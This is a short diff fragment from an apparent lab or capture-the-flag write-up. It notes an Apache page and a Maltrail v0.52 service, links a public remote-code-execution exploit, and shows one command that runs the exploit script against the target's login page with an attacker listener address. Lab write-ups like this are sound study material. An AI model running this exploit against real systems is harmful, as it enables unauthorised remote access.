@@ -14,7 +14,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 port 80 is apache page nothing interested  
 port 8338 is maltrail v0.52  
-search and found the rce script 
+search and found the rce script     
 https://github.com/joshchalabi/Maltrail-0.52-Exploit-RCE
 ```console
 $ sh exploit.sh 192.168.245.32:8338/login 192.168.45.229 80
